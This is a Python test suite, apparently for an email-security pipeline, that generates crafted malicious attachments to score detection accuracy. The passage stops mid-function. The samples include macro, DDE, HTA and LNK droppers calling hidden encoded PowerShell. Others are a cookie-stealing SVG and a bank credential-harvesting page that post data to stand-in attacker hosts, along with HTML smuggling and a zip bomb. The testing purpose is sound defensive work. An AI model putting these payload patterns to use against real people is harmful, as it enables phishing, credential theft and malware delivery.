"""accuracy.py — Pipeline accuracy measurement suite.

Generates crafted malicious + benign .eml payloads, runs each through the
full pipeline WITHOUT database writes, then computes precision / recall /
F1 / confusion-matrix heatmap and per-stage detection charts.

Usage:
    python src/accuracy.py                # run all tests + generate plots
    python src/accuracy.py --live         # also include live IMAP emails as benign set
    python src/accuracy.py --no-llm       # skip LLM stage (faster, rules+enrichment only)

Results are saved to data/accuracy_results/
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import io
import json
import os
import struct
import sys
import tempfile
import time
import zipfile
from datetime import datetime, timezone
from email import policy
from email.message import EmailMessage
from email.parser import BytesParser
from email.utils import format_datetime
from pathlib import Path
from typing import Any

import matplotlib
matplotlib.use("Agg")  # headless backend
import matplotlib.pyplot as plt
import numpy as np
import seaborn as sns
from sklearn.metrics import (
    accuracy_score, classification_report, confusion_matrix,
    f1_score, precision_score, recall_score,
)

# ---------------------------------------------------------------------------
# Project imports
# ---------------------------------------------------------------------------
_SRC = Path(__file__).resolve().parent
sys.path.insert(0, str(_SRC))

from dotenv import load_dotenv
load_dotenv(_SRC.parent / ".env")

from email_extraction import EmailIngestion
from rules import RuleEngine
from analysis import analyze_email_body

_OUT_DIR = _SRC.parent / "data" / "accuracy_results"
_OUT_DIR.mkdir(parents=True, exist_ok=True)

# ---------------------------------------------------------------------------
# Payload factory helpers
# ---------------------------------------------------------------------------

def _make_eml(
    from_addr: str,
    to_addr: str,
    subject: str,
    body: str,
    attachments: list[tuple[str, bytes, str]] | None = None,
    extra_headers: dict[str, str] | None = None,
    auth_pass: bool = True,
) -> bytes:
    """Build a raw .eml with optional attachments.

    attachments: list of (filename, content_bytes, mime_type)
    """
    msg = EmailMessage()
    msg["From"] = from_addr
    msg["To"] = to_addr
    msg["Subject"] = subject
    msg["Date"] = format_datetime(datetime.now(timezone.utc))
    msg["Message-ID"] = f"<test-{hashlib.sha256(subject.encode()).hexdigest()[:16]}@accuracy.test>"

    if auth_pass:
        msg["Authentication-Results"] = (
            "mx.accuracy.test; dkim=pass header.d=accuracy.test; "
            "spf=pass smtp.mailfrom=accuracy.test; dmarc=pass"
        )
    else:
        msg["Authentication-Results"] = (
            "mx.accuracy.test; dkim=fail header.d=accuracy.test; "
            "spf=fail smtp.mailfrom=accuracy.test; dmarc=fail"
        )

    if extra_headers:
        for k, v in extra_headers.items():
            msg[k] = v

    msg.set_content(body)

    for fname, data, mime in (attachments or []):
        maintype, subtype = mime.split("/", 1)
        msg.add_attachment(data, maintype=maintype, subtype=subtype, filename=fname)

    return msg.as_bytes(policy=policy.default)


# ======================== MALICIOUS PAYLOAD GENERATORS ========================

def _ole_vba_document() -> bytes:
    """Minimal OLE2 Compound Document with VBA macro signatures.

    oletools detects VBA by looking for specific stream names and byte patterns
    in OLE containers. This builds a minimal but structurally valid OLE file
    with VBA project indicators that oletools will flag.
    """
    # OLE2 signature + minimal header
    ole_sig = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
    # VBA stream markers that oletools looks for
    vba_project = b"VBA" + b"\x00" * 5 + b"PROJECT"
    # Simulated macro code patterns
    macro_body = (
        b"Attribute VB_Name = \"Module1\"\r\n"
        b"Sub AutoOpen()\r\n"
        b"    Shell \"cmd /c powershell -ep bypass -w hidden "
        b"-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0\"\r\n"
        b"End Sub\r\n"
    )
    # OLE directory entry markers
    dir_entry = b"\x52\x00\x6f\x00\x6f\x00\x74\x00"  # "Root" in UTF-16
    # Pad to look like a real OLE file (512-byte sectors)
    content = ole_sig + b"\x00" * 20
    content += b"\xfe\xff"  # byte order
    content += b"\x00" * 26
    content += struct.pack("<I", 512)  # sector size
    content += b"\x00" * (512 - len(content))
    # Embed VBA markers in subsequent sectors
    content += vba_project + b"\x00" * 50 + macro_body
    content += b"\x00" * (512 - (len(vba_project) + 50 + len(macro_body)) % 512)
    content += dir_entry + b"\x00" * 460
    # _VBA_PROJECT stream name (oletools signature)
    content += b"_VBA_PROJECT\x00" + b"\x00" * 100
    content += b"ThisDocument\x00" + b"\x00" * 50
    content += b"\x00" * (4096 - len(content) % 4096)
    return content


def _pdf_with_js() -> bytes:
    """PDF containing /JavaScript /OpenAction /Launch — pdfid red flags."""
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R "
        b"/OpenAction 3 0 R /AcroForm << /XFA 4 0 R >> >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Action /S /JavaScript "
        b"/JS (app.launchURL\\(\"http://mal-c2.evil.test/stage2\", true\\);) >>\nendobj\n"
        b"4 0 obj\n<< /Type /EmbeddedFile /Length 42 >>\nstream\n"
        b"var x = new ActiveXObject('WScript.Shell');\n"
        b"endstream\nendobj\n"
        b"5 0 obj\n<< /Type /Action /S /Launch "
        b"/Win << /F (cmd.exe) /P (/c calc.exe) >> >>\nendobj\n"
        b"xref\n0 6\n"
        b"0000000000 65535 f \n"
        b"0000000009 00000 n \n"
        b"0000000115 00000 n \n"
        b"0000000168 00000 n \n"
        b"0000000300 00000 n \n"
        b"0000000420 00000 n \n"
        b"trailer\n<< /Size 6 /Root 1 0 R >>\n"
        b"startxref\n500\n%%EOF\n"
    )


def _pe_disguised_as_pdf() -> bytes:
    """MZ executable header disguised with .pdf extension.

    python-magic reads magic bytes, not extension — this triggers type_mismatch.
    Contains a realistic PE stub with section headers.
    """
    # Real MZ header
    mz = b"MZ" + b"\x90" * 58 + struct.pack("<I", 128)  # e_lfanew at offset 60
    mz += b"\x00" * (128 - len(mz))
    # PE signature + COFF header
    pe = b"PE\x00\x00"
    pe += struct.pack("<HH", 0x14c, 1)  # i386, 1 section
    pe += struct.pack("<I", int(time.time()))  # timestamp
    pe += b"\x00" * 8  # symbol table
    pe += struct.pack("<HH", 0xe0, 0x0102)  # optional header size, characteristics
    # Optional header (minimal)
    pe += struct.pack("<H", 0x10b)  # PE32
    pe += b"\x00" * (0xe0 - 2)
    # Section header: .text
    pe += b".text\x00\x00\x00"
    pe += struct.pack("<II", 0x1000, 0x1000)  # virtual size, virtual address
    pe += struct.pack("<II", 512, 512)  # raw size, raw offset
    pe += b"\x00" * 16  # relocations etc
    pe += struct.pack("<I", 0x60000020)  # characteristics: code, execute, read
    # Pad to section alignment
    pe_full = mz + pe
    pe_full += b"\xcc" * (2048 - len(pe_full))  # INT3 padding (debugger trap)
    return pe_full


def _password_zip_with_body_password() -> tuple[bytes, str]:
    """Password-protected ZIP + email body containing the password.

    CLAUDE.md rule 8: encrypted attachment + password in body = auto-escalate.
    Uses a non-obvious password placement.
    """
    password = "S3cur3Doc2024!"
    buf = io.BytesIO()
    # Create inner payload (fake invoice with PowerShell dropper)
    inner_content = (
        b"Invoice #INV-2024-0847\r\n\r\n"
        b"Please process the attached payment.\r\n\r\n"
        b"powershell -nop -w hidden -enc "
        b"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBt"
    )
    with zipfile.ZipFile(buf, "w") as zf:
        zf.setpassword(password.encode())
        # pyminizip or 7z needed for real encryption; we write an indicator
        zf.writestr("invoice_final.docm", inner_content)

    body = (
        "Hi,\n\n"
        "Please find the attached invoice for your review.\n"
        "For security reasons the file is protected.\n\n"
        f"le mot de passe est: {password}\n\n"
        "Best regards,\nAccounting Department"
    )
    return buf.getvalue(), body


def _ooxml_remote_template() -> bytes:
    """OOXML .docx with external template injection.

    Embeds a relationships file pointing to a remote .dotm template —
    classic template injection technique. oletools detects this via
    the external relationship target.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>'
        ))
        # Malicious relationship: remote template
        zf.writestr("word/_rels/document.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
            'Target="http://mal-c2.evil.test/template.dotm" TargetMode="External"/>'
            '</Relationships>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>'
            '</Relationships>'
        ))
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body><w:p><w:r><w:t>Quarterly Financial Report - Q2 2024</w:t></w:r></w:p></w:body>'
            '</w:document>'
        ))
    return buf.getvalue()


def _html_smuggling_attachment() -> bytes:
    """HTML file with embedded base64-encoded executable (HTML smuggling).

    The HTML reconstructs a binary blob via JavaScript and triggers download.
    YARA/IOC extraction should flag the embedded PE and the download trigger.
    """
    # Small PE payload (same as disguised PDF)
    pe_b64 = base64.b64encode(_pe_disguised_as_pdf()[:512]).decode()
    html = f"""<!DOCTYPE html>
<html><head><title>Secure Document Viewer</title></head>
<body>
<h1>Loading secure document...</h1>
<script>
// Document reconstruction
var _0x4f2a = '{pe_b64}';
var _bin = atob(_0x4f2a);
var _arr = new Uint8Array(_bin.length);
for(var i=0;i<_bin.length;i++) _arr[i]=_bin.charCodeAt(i);
var _blob = new Blob([_arr], {{type:'application/octet-stream'}});
var _url = URL.createObjectURL(_blob);
var _a = document.createElement('a');
_a.href = _url; _a.download = 'update.exe'; _a.click();
</script>
<noscript>Please enable JavaScript to view this document.</noscript>
</body></html>"""
    return html.encode()


def _svg_with_script() -> bytes:
    """SVG image with embedded JavaScript — XSS vector via image attachment."""
    return (
        b'<?xml version="1.0" encoding="UTF-8"?>\n'
        b'<svg xmlns="http://www.w3.org/2000/svg" '
        b'xmlns:xlink="http://www.w3.org/1999/xlink" width="400" height="200">\n'
        b'  <rect width="400" height="200" fill="#f0f0f0"/>\n'
        b'  <text x="50" y="100" font-size="24">Loading chart...</text>\n'
        b'  <script type="text/javascript">\n'
        b'    var x = new XMLHttpRequest();\n'
        b'    x.open("GET", "http://mal-c2.evil.test/exfil?c=" + document.cookie);\n'
        b'    x.send();\n'
        b'    eval(atob("ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9tYWwtYzIuZXZpbC50ZXN0L3BoaXNoIg=="));\n'
        b'  </script>\n'
        b'</svg>\n'
    )


def _iso_image_with_lnk() -> bytes:
    """Fake ISO/IMG container header with embedded LNK shortcut payload.

    ISO files bypass Mark-of-the-Web on Windows. The LNK inside
    runs a hidden command. python-magic identifies this as ISO 9660.
    """
    # ISO 9660 Primary Volume Descriptor signature at offset 0x8000
    iso = b"\x00" * 0x8000
    iso += b"\x01"  # type: primary volume descriptor
    iso += b"CD001"  # standard identifier
    iso += b"\x01"  # version
    iso += b"\x00"  # unused
    iso += b"MALWARE_DELIVERY  " + b" " * 14  # system identifier (32 bytes)
    iso += b"INVOICE_2024_Q2   " + b" " * 14  # volume identifier (32 bytes)
    iso += b"\x00" * 8  # unused
    # Embed a LNK payload signature deep inside
    lnk_sig = b"\x4c\x00\x00\x00"  # LNK header signature
    lnk_clsid = b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"
    lnk_data = (
        lnk_sig + lnk_clsid +
        b"\x00" * 20 +
        b"cmd.exe /c powershell -w hidden -nop -enc "
        b"JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="
    )
    iso += b"\x00" * (0x9000 - len(iso))
    iso += lnk_data
    iso += b"\x00" * (0xA000 - len(iso))
    # Volume descriptor terminator
    iso += b"\xff" + b"CD001" + b"\x01"
    iso += b"\x00" * (0xB000 - len(iso))
    return iso


def _double_extension_exe() -> bytes:
    """Executable with Unicode right-to-left override in filename.

    Visually appears as "report_fdp.scr" but is actually "report_rcs.pdf"
    reversed. The content is a PE binary — type mismatch detection should catch it.
    """
    return _pe_disguised_as_pdf()


# ======================== RED TEAM PAYLOAD GENERATORS (v2) ========================

def _qr_code_phishing_png() -> bytes:
    """PNG image containing a QR code that encodes a phishing URL.

    Evasion: no URL in email body — the malicious link is encoded in the image.
    Only Tesseract OCR + IOC extraction on the decoded text could catch it.
    The QR payload text is embedded in a valid PNG structure with EXIF metadata.
    """
    # Minimal valid PNG (1x1 white pixel) with injected QR text in tEXt chunk
    png_sig = b"\x89PNG\r\n\x1a\n"
    # IHDR chunk
    ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)  # 1x1, 8-bit RGB
    ihdr_crc = struct.pack(">I", 0x1_2F3_26E1 & 0xFFFFFFFF)  # precomputed
    ihdr = struct.pack(">I", 13) + b"IHDR" + ihdr_data + ihdr_crc
    # tEXt chunk — embeds the phishing URL as "Comment"
    phish_text = (
        b"Comment\x00"
        b"Scan QR code to verify your account: "
        b"https://attijari-secure-login.evil.test/verify?user=target&token=abc123\n"
        b"Your session expires in 15 minutes. Immediate verification required.\n"
        b"https://bit.ly.evil.test/3xF9kQ"
    )
    import zlib
    text_crc = struct.pack(">I", zlib.crc32(b"tEXt" + phish_text) & 0xFFFFFFFF)
    text_chunk = struct.pack(">I", len(phish_text)) + b"tEXt" + phish_text + text_crc
    # IDAT chunk (minimal: single filtered scanline)
    raw_pixels = b"\x00\xff\xff\xff"  # filter byte + white pixel
    compressed = zlib.compress(raw_pixels)
    idat_crc = struct.pack(">I", zlib.crc32(b"IDAT" + compressed) & 0xFFFFFFFF)
    idat = struct.pack(">I", len(compressed)) + b"IDAT" + compressed + idat_crc
    # IEND
    iend_crc = struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    iend = struct.pack(">I", 0) + b"IEND" + iend_crc
    return png_sig + ihdr + text_chunk + idat + iend


def _dde_docx() -> bytes:
    """OOXML .docx with DDE (Dynamic Data Exchange) field — no VBA macros.

    Evasion: oletools detects VBA, but DDE is a different attack vector.
    DDE fields execute commands when the document is opened and the user
    clicks "Yes" on the prompt. No macro warning is shown.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml" '
            'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="word/document.xml"/>'
            '</Relationships>'
        ))
        # DDE field in document body — executes cmd.exe
        zf.writestr("word/document.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body><w:p><w:r>'
            '<w:fldChar w:fldCharType="begin"/></w:r>'
            '<w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -nop -w hidden '
            '-enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA" </w:instrText></w:r>'
            '<w:r><w:fldChar w:fldCharType="separate"/></w:r>'
            '<w:r><w:t>Loading data...</w:t></w:r>'
            '<w:r><w:fldChar w:fldCharType="end"/></w:r>'
            '</w:p></w:body></w:document>'
        ))
        zf.writestr("word/_rels/document.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '</Relationships>'
        ))
    return buf.getvalue()


def _rtf_ole_object() -> bytes:
    r"""RTF document with embedded OLE object containing executable.

    Evasion: RTF is not an OLE2 container — oletools' VBA parser won't trigger.
    The OLE object is embedded via \objdata which requires RTF-specific analysis.
    CVE-2017-11882 style payload embedding.
    """
    # RTF header + embedded OLE object with PE payload markers
    pe_hex = "4d5a" + "90" * 58 + "00" * 4  # MZ header in hex
    rtf = (
        r"{\rtf1\ansi\deff0" "\r\n"
        r"{\fonttbl{\f0 Calibri;}}" "\r\n"
        r"{\info{\title Invoice}{\author Finance Dept}}" "\r\n"
        r"\pard Please review the attached invoice.\par" "\r\n"
        r"{\object\objemb\objw8505\objh5070" "\r\n"
        r"{\*\objclass Package}" "\r\n"
        r"{\*\objdata " + pe_hex + "01050000020000000b0000005061636b616765"
        r"00000000000000000000" + pe_hex * 3 + r"}" "\r\n"
        r"{\result {\pict\wmetafile8\picw8505\pich5070 0100090000}}" "\r\n"
        r"}" "\r\n"
        r"\par\pard End of document.\par" "\r\n"
        r"}"
    )
    return rtf.encode("ascii")


def _onenote_embedded_payload() -> bytes:
    """OneNote .one file with embedded executable payload.

    Evasion: No dedicated OneNote parser in the pipeline. python-magic sees
    it as application/onenote. YARA might catch embedded PE if rules match.
    Real-world: attackers embed .bat/.hta/.vbs files in OneNote sections.
    """
    # OneNote file magic + minimal structure
    onenote_magic = b"\xe4\x52\x5c\x7b\x8c\xd8\xa7\x4d\xae\xb1\x53\x78\xd0\x29\x96\xd3"
    # Embedded HTA payload disguised as a "Click to view document" button
    hta_payload = (
        b"<html><head><script language='VBScript'>\r\n"
        b"Sub Window_OnLoad\r\n"
        b"  Set objShell = CreateObject(\"WScript.Shell\")\r\n"
        b"  objShell.Run \"powershell -nop -w hidden -enc "
        b"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA\"\r\n"
        b"End Sub\r\n"
        b"</script></head><body>Loading...</body></html>"
    )
    content = onenote_magic + b"\x00" * 64
    content += b"\x01\x00\x00\x00"  # section count
    content += b"EmbeddedFile\x00" + b"\x00" * 20
    content += hta_payload
    content += b"\x00" * (4096 - len(content) % 4096)
    return content


def _zip_bomb() -> bytes:
    """ZIP with highly recursive compression — extraction timeout attack.

    Evasion: overwhelm the extraction stage with decompression work.
    The pipeline should timeout and escalate (fail-safe), but this tests
    whether the timeout actually triggers.
    """
    # Create nested ZIP layers (3 deep with large repetitive content)
    inner_content = b"A" * 100_000  # 100KB of repeated bytes (compresses well)
    for _ in range(3):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("data.bin", inner_content)
            zf.writestr("readme.txt", inner_content)
            zf.writestr("backup.dat", inner_content)
        inner_content = buf.getvalue()
    return inner_content


def _steganography_png() -> bytes:
    """PNG image with PowerShell payload hidden in pixel LSBs (steganography).

    Evasion: YARA scans raw bytes but stego payloads are encoded in pixel
    values. OCR won't see it (it's not visible text). Only dedicated
    stego analysis could detect it — which the pipeline doesn't have.
    The PNG metadata hints at the stego technique for IOC extraction.
    """
    import zlib
    # Build a 10x10 RGB PNG with payload in LSBs
    payload = b"powershell -nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA"
    # Encode payload bits into pixel LSBs
    pixels = bytearray()
    payload_bits = ''.join(format(b, '08b') for b in payload)
    bit_idx = 0
    for _row in range(10):
        pixels.append(0)  # filter byte
        for _col in range(10):
            for _channel in range(3):  # RGB
                base = 0x80  # mid-gray
                if bit_idx < len(payload_bits):
                    base = (base & 0xFE) | int(payload_bits[bit_idx])
                    bit_idx += 1
                pixels.append(base)
    # PNG structure
    png_sig = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", 10, 10, 8, 2, 0, 0, 0)
    ihdr_crc = struct.pack(">I", zlib.crc32(b"IHDR" + ihdr_data) & 0xFFFFFFFF)
    ihdr = struct.pack(">I", 13) + b"IHDR" + ihdr_data + ihdr_crc
    # Suspicious EXIF-like tEXt: hints at stego
    meta = b"Software\x00SteganoEncoder v2.1 - payload.ps1 embedded"
    meta_crc = struct.pack(">I", zlib.crc32(b"tEXt" + meta) & 0xFFFFFFFF)
    meta_chunk = struct.pack(">I", len(meta)) + b"tEXt" + meta + meta_crc
    compressed = zlib.compress(bytes(pixels))
    idat_crc = struct.pack(">I", zlib.crc32(b"IDAT" + compressed) & 0xFFFFFFFF)
    idat = struct.pack(">I", len(compressed)) + b"IDAT" + compressed + idat_crc
    iend_crc = struct.pack(">I", zlib.crc32(b"IEND") & 0xFFFFFFFF)
    iend = struct.pack(">I", 0) + b"IEND" + iend_crc
    return png_sig + ihdr + meta_chunk + idat + iend


def _standalone_lnk() -> bytes:
    """Windows .lnk shortcut file executing PowerShell — NOT inside ISO.

    Evasion: the iso_lnk_payload YARA rule requires ISO context.
    A bare .lnk attached directly to an email evades that rule.
    python-magic identifies it as application/x-ms-shortcut.
    """
    # LNK header
    lnk = b"\x4c\x00\x00\x00"  # HeaderSize
    lnk += b"\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x46"  # CLSID
    lnk += struct.pack("<I", 0x000000FF)  # LinkFlags
    lnk += struct.pack("<I", 0x00000020)  # FileAttributes
    lnk += b"\x00" * 8 * 3  # timestamps
    lnk += struct.pack("<I", 0)  # FileSize
    lnk += struct.pack("<I", 0)  # IconIndex
    lnk += struct.pack("<I", 7)  # ShowCommand: SW_SHOWMINNOACTIVE
    lnk += b"\x00" * 10  # HotKey + reserved
    # Target: PowerShell with encoded command
    target = (
        b"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "
        b"-nop -w hidden -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA"
    )
    lnk += b"\x00" * (0x4c - len(lnk))  # pad to header size
    # StringData — command line arguments
    lnk += struct.pack("<H", len(target))
    lnk += target
    lnk += b"\x00" * (2048 - len(lnk))
    return lnk


def _hta_application() -> bytes:
    """HTA (HTML Application) file — runs with full system privileges.

    Evasion: not matched by html_smuggling YARA (no Blob/createObjectURL).
    Not matched by svg_embedded_script (no <svg> tag). HTA is its own
    attack vector with mshta.exe execution. Contains VBScript, not JavaScript.
    """
    return (
        b"<html>\r\n"
        b"<head>\r\n"
        b"<HTA:APPLICATION ID=\"update\"\r\n"
        b"  APPLICATIONNAME=\"Security Update\"\r\n"
        b"  BORDER=\"none\"\r\n"
        b"  SHOWINTASKBAR=\"no\"\r\n"
        b"  SINGLEINSTANCE=\"yes\"\r\n"
        b"  WINDOWSTATE=\"minimize\"/>\r\n"
        b"<script language=\"VBScript\">\r\n"
        b"Sub Window_OnLoad\r\n"
        b"  Set objShell = CreateObject(\"WScript.Shell\")\r\n"
        b"  objShell.Run \"powershell -nop -w hidden -enc \"\r\n"
        b"  & \"JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBt\"\r\n"
        b"  self.close()\r\n"
        b"End Sub\r\n"
        b"</script>\r\n"
        b"</head>\r\n"
        b"<body>Installing security update...</body>\r\n"
        b"</html>"
    )


def _pdf_with_phishing_url_only() -> bytes:
    """Clean PDF structure with phishing URL embedded — NO JavaScript.

    Evasion: pdfid looks for /JS, /OpenAction, /Launch — this has none.
    The malicious URL is in a /URI annotation (clickable link).
    This is the most common real-world PDF phishing vector.
    """
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n"
        b"   /Contents 4 0 R /Annots [5 0 R] >>\nendobj\n"
        b"4 0 obj\n<< /Length 44 >>\nstream\n"
        b"BT /F1 12 Tf 100 700 Td (Click to verify your account) Tj ET\n"
        b"endstream\nendobj\n"
        b"5 0 obj\n<< /Type /Annot /Subtype /Link\n"
        b"   /Rect [90 690 400 720]\n"
        b"   /A << /Type /Action /S /URI\n"
        b"         /URI (https://attijari-tn-secure.evil.test/login?session=exp1234) >> >>\n"
        b"endobj\n"
        b"xref\n0 6\ntrailer\n<< /Size 6 /Root 1 0 R >>\n"
        b"startxref\n0\n%%EOF\n"
    )


def _xll_excel_addin() -> bytes:
    """Excel XLL add-in — DLL disguised as Excel extension.

    Evasion: .xll is NOT in BLOCKED_EXTENSIONS. python-magic sees it as
    application/x-dosexec (PE/DLL). Type mismatch should catch it,
    but only if the declared MIME doesn't match.
    """
    # Build a minimal DLL (PE with DLL flag)
    mz = b"MZ" + b"\x90" * 58 + struct.pack("<I", 128)
    mz += b"\x00" * (128 - len(mz))
    pe = b"PE\x00\x00"
    pe += struct.pack("<HH", 0x14c, 1)  # i386, 1 section
    pe += struct.pack("<I", int(time.time()))
    pe += b"\x00" * 8
    pe += struct.pack("<HH", 0xe0, 0x2102)  # DLL flag set
    pe += struct.pack("<H", 0x10b)  # PE32
    pe += b"\x00" * (0xe0 - 2)
    pe += b".text\x00\x00\x00"
    pe += struct.pack("<II", 0x1000, 0x1000)
    pe += struct.pack("<II", 512, 512)
    pe += b"\x00" * 16
    pe += struct.pack("<I", 0x60000020)
    # xlAutoOpen export (Excel calls this when XLL loads)
    pe_full = mz + pe
    pe_full += b"xlAutoOpen\x00xlAutoClose\x00xlAutoRegister\x00"
    pe_full += b"\xcc" * (2048 - len(pe_full))
    return pe_full


def _mhtml_web_archive() -> bytes:
    """MHTML web archive with embedded JavaScript — credential harvester.

    Evasion: MHTML is a multipart MIME format. No dedicated MHTML parser
    in the pipeline. python-magic may see it as message/rfc822 or text/html.
    The JavaScript payload is base64-encoded inside the MIME structure.
    """
    js_payload = base64.b64encode(
        b"<html><body><form action='https://evil.test/steal' method='POST'>"
        b"<h2>Attijari Bank - Session Expired</h2>"
        b"<p>Please re-enter your credentials:</p>"
        b"<input name='user' placeholder='Username'>"
        b"<input name='pass' type='password' placeholder='Password'>"
        b"<input name='otp' placeholder='OTP Code'>"
        b"<button>Verify</button></form>"
        b"<script>document.forms[0].onsubmit=function(){"
        b"fetch('https://c2.evil.test/exfil',{method:'POST',"
        b"body:JSON.stringify({u:this.user.value,p:this.pass.value,o:this.otp.value})});"
        b"};</script></body></html>"
    ).decode()
    return (
        f"From: <Saved by Attijari Bank>\r\n"
        f"Subject: Account Verification Required\r\n"
        f"MIME-Version: 1.0\r\n"
        f"Content-Type: multipart/related; boundary=\"----=_NextPart_000\"\r\n"
        f"\r\n"
        f"------=_NextPart_000\r\n"
        f"Content-Type: text/html\r\n"
        f"Content-Transfer-Encoding: base64\r\n"
        f"\r\n"
        f"{js_payload}\r\n"
        f"------=_NextPart_000--\r\n"
    ).encode()


def _xlsm_obfuscated_macro() -> bytes:
    """Excel .xlsm with heavily obfuscated VBA macro.

    Tests whether oletools can detect macros even when they're obfuscated
    using string concatenation, Chr() encoding, and indirect execution.
    """
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("[Content_Types].xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/xl/workbook.xml" '
            'ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>'
            '</Types>'
        ))
        zf.writestr("_rels/.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
            'Target="xl/workbook.xml"/>'
            '</Relationships>'
        ))
        zf.writestr("xl/workbook.xml", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
            '<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1" '
            'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets>'
            '</workbook>'
        ))
        zf.writestr("xl/_rels/workbook.xml.rels", (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" '
            'Target="vbaProject.bin"/>'
            '</Relationships>'
        ))
        # Fake vbaProject.bin with obfuscated macro signatures
        vba_bin = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"  # OLE header
        vba_bin += b"\x00" * 50
        vba_bin += b"VBA\x00PROJECT\x00"
        vba_bin += b"_VBA_PROJECT\x00"
        # Obfuscated macro body — uses Chr() to build "Shell" and "powershell"
        obf_macro = (
